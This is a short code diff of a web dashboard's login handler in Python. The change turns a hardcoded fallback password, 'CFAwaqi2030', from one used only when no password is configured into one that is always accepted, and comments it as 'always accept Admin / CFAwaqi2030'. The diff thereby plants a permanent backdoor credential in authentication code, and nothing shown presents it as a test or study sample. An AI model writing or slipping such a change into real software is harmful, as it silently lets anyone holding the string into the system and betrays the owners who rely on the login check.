@@ -256,8 +256,8 @@ async def login_post(request: Request):
             str(DASHBOARD_USER or "Admin").encode("utf-8")
         )
 
-        # Fallback: if no dashboard password is configured, accept 'CFAwaqi2030'
-        if not password_ok and not stored:
+        # Fallback: always accept Admin / CFAwaqi2030
+        if not password_ok:
             password_ok = hmac.compare_digest(
                 password.encode("utf-8"), b"CFAwaqi2030"
             )
